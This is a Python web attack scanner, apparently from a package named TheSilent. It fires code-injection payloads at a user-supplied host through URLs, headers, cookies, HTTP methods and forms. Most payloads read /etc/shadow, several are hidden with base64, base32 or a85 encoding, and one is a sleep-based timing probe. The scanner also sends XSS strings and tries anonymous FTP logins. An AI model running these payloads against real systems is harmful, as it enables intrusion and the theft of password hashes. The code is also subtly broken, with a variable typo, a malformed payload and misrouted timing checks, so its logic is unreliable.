import re
import socket
import time
import urllib.parse
from ftplib import FTP,FTP_TLS
from urllib.parse import *
import TheSilent.puppy_requests as puppy_requests
from TheSilent.clear import clear
from TheSilent.return_user_agent import return_user_agent

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

mal_python = {r"eval(compile('import time\ntime.sleep(60)','melon','exec'))":120,
              r"eval(compile('import os\nos.system(\'cat /etc/shadow\')','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\nos.system(base64.b64decode(b\'Y2F0IC9ldGMvc2hhZG93\').decode())','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\nos.system(base64.b32decode(b\'MNQXIIBPMV2GGL3TNBQWI33X\').decode())','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\nos.system(base64.b16decode(b\'636174202F6574632F736861646F77\').decode())','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\nos.system(base64.a85decode(b\'@psI%04f6806:f8A8cY\').decode())','melon','exec'))":"root:|daemon:|bin:|sys:|root:|daemon:|bin:|sys:",
              r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.b64decode(b\'L2V0Yy9zaGFkb3c=\'),\'r\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.b32decode(b\'F5SXIYZPONUGCZDPO4======\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.b16decode(b\'2F6574632F736861646F77\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))":"root:|daemon:|bin:|sys:",
              r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.a85decode(b\'@psI%04f6806:f8A8cY\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))":"root:|daemon:|bin:|sys:"}

mal_xss = {"<bold>melon</bold>":"<bold>melon</bold>",
           "<del>melon</del>":"<del>melon</del>",
           "<em>melon</em>":"<em>melon</em>",
           "<i>melon</i>":"<i>melon</i>",
           "<iframe>melon</iframe>":"<iframe>melon</iframe>",
           "<ins>melon</ins>":"<ins>melon</ins>",
           "<script>alert('melon')</script>":"<script>alert('melon')</script>",
           "<script>prompt('melon')</script>":"<script>prompt('melon')</script>",
           "<mark>melon</mark>":"<mark>melon</mark>",
           "<small>melon</small>":"<small>melon</small>",
           "<strong>melon</strong>":"<strong>melon</strong>",
           "<sub>melon</sub>":"<sub>melon</sub>",
           "<sup>melon</sup>":"<sup>melon</sup>",
           "<title>melon</title>":"<title>melon</title>"}
    
def melon(host,delay=0):
    host = host.rstrip("/")
    print(CYAN + "")
    clear()
    all_forms = []
    hits = []

    try:
        original_page = puppy_requests.text(host)
        all_forms = re.findall("<form[\S\s\n]+/form>",original_page)
    except:
        pass

    # check for python injection
    print(CYAN + "checking for python injection in url")
    for mal in list(mal_python.keys()):
        try:
            time.sleep(delay)
            if type(mal_python[mal]) == str:
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
                if re.search(mal_python[mal],data.lower()):
                    hits.append(f"python injection in url ({host}): {mal}")

            if type(mal_python[mal]) == int:
                start = time.time()
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal),timeout=mal_python[mal])
                end = time.time()
                if end - start >= 45:
                    hits.append(f"python injection in url ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for python injection in header")
    for mal in list(mal_python.keys()):
        try:
            time.sleep(delay)
            if type(mal_python[mal]) == str:
                data = puppy_requests.text(host,headers={"Referer":mal})
                if re.search(mal_python[mal],data.lower()):
                    hits.append(f"python injection in header ({host}): {mal}")

            if type(mal_python[mal]) == int:
                start = time.time()
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal),timeout=mal_python[mal])
                end = time.time()
                if end - start >= 45:
                    hits.append(f"python injection in header ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for python injection in cookie")
    for mal in list(mal_python.keys()):
        try:
            time.sleep(delay)
            if type(mmal_python[mal]) == str:
                data = puppy_requests.text(host,headers={"Cookie":mal})
                if re.search(mal_python[mal],data.lower()):
                    hits.append(f"python injection in cookie ({host}): {mal}")

            if type(mal_python[mal]) == int:
                start = time.time()
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal),timeout=mal_python[mal])
                end = time.time()
                if end - start >= 45:
                    hits.append(f"python injection in cookie ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for python injection in method")
    for mal in list(mal_python.keys()):
        try:
            time.sleep(delay)
            if type(mal_python[mal]) == str:
                data = puppy_requests.text(host,method=mal.upper())
                if re.search(mal_python[mal],data.lower()):
                    hits.append(f"python injection in method ({host}): {mal}")

                if type(mal_python[mal]) == int:
                    start = time.time()
                    data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal),timeout=mal_python[mal])
                    end = time.time()
                    if end - start >= 45:
                        hits.append(f"python injection in method ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for python injection in forms")
    for mal in list(mal_python.keys()):
        try:
            if len(all_forms) > 0:
                for form in all_forms:
                    time.sleep(delay)
                    action_bool = True
                    form_names = []
                    mal_value = []
                    form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                    form_input = re.findall("<input.+>",form)
                    for field in form_input:
                        form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_names.append(form_name)
                        if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                            mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']",field)[0])

                        else:
                            mal_value.append(mal)

                    try:
                        action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                        if action_tag.startswith("https://") or action_tag.startswith("http://"):
                            action = action_tag

                        if action_tag.startswith("/"):
                            action = host + action_tag

                        else:
                            action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag
                    except IndexError:
                        action_bool = False

                    if action_bool:
                        if type(mal_python[mal]) == str:
                            data = puppy_requests.text(action,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                            if re.search(mal_python[mal],data.lower()):
                                hits.append(f"python injection in forms ({action}): {dict(zip(form_names,mal_value))}")

                        if type(mal_python[mal]) == int:
                            start = time.time()
                            data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal),timeout=mal_python[mal])
                            end = time.time()
                            if end - start >= 45:
                                hits.append(f"python injection in forms ({host})- {dict(zip(form_names,mal_value))}")

                    else:
                        if type(mal_python[mal]) == str:
                            data = puppy_requests.text(host,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                            if re.search(mal_python[mal],data.lower()):
                                hits.append(f"python injection in forms ({host})- {dict(zip(form_names,mal_value))}")

                        if type(mal_python[mal]) == int:
                            start = time.time()
                            data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal),timeout=mal_python[mal])
                            end = time.time()
                            if end - start >= 45:
                                hits.append(f"python injection in forms ({host})- {dict(zip(form_names,mal_value))}")

        except:
            pass

    # check for xss
    print(CYAN + "checking for xss in url")
    for mal in mal_xss:
        try:
            time.sleep(delay)
            data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
            if re.search(mal_xss[mal],data.lower()):
                hits.append(f"xss in url ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for xss in header")
    for mal in mal_xss:
        try:
            time.sleep(delay)
            data = puppy_requests.text(host,headers={"Referer":mal})
            if re.search(mal_xss[mal],data.lower()):
                hits.append(f"xss in header ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for xss in cookie")
    for mal in mal_xss:
        try:
            time.sleep(delay)
            data = puppy_requests.text(host,headers={"Cookie":mal})
            if re.search(mal_xss[mal],data.lower()):
                hits.append(f"xss in cookie ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for xss in method")
    for mal in mal_xss:
        try:
            time.sleep(delay)
            data = puppy_requests.text(host,method=mal.upper())
            if re.search(mal_xss[mal],data.lower()):
                hits.append(f"xss in method ({host}): {mal}")
        except:
            pass

    print(CYAN + "checking for xss in forms")
    for mal in mal_xss:
        try:
            if len(all_forms) > 0:
                for form in all_forms:
                    time.sleep(delay)
                    action_bool = True
                    form_names = []
                    mal_value = []
                    form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                    form_input = re.findall("<input.+>",form)
                    for field in form_input:
                        form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_names.append(form_name)
                        if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                            mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']",field)[0])

                        else:
                            mal_value.append(mal)

                    try:
                        action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                        if action_tag.startswith("https://") or action_tag.startswith("http://"):
                            action = action_tag

                        if action_tag.startswith("/"):
                            action = host + action_tag

                        else:
                            action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag

                    except IndexError:
                        action_bool = False

                    if action_bool:
                        data = puppy_requests.text(action,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                        if re.search(mal_xss[mal],data.lower()):
                            hits.append(f"xss in forms ({action}): {dict(zip(form_names,mal_value))}")

                    else:
                        data = puppy_requests.text(host,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                        if re.search(mal_xss[mal],data.lower()):
                            hits.append(f"xss in forms ({host})- {dict(zip(form_names,mal_value))}")
        except:
            pass

    # check for anonymous ftp bind
    print(CYAN + "checking for anonymous ftp bind")
    try:
        ftp = FTP(urllib.parse.urlparse(host).netloc,timeout=10)
        ftp.login()
        ftp.quit()
        hits.append("anonymous ftp bind allowed")
    except:
        pass

    # check for anonymous secure ftp bind
    print(CYAN + "checking for secure anonymous ftp bind")
    try:
        ftp = FTP_TLS(urllib.parse.urlparse(host).netloc,timeout=10)
        ftp.login()
        ftp.quit()
        hits.append("secure anonymous ftp bind allowed")
    except:
        pass

    hits = list(set(hits[:]))
    hits.sort()
    clear()
    if len(hits) > 0:
        for hit in hits:
            print(hit)

    else:
        print("we didn't find anything interesting")
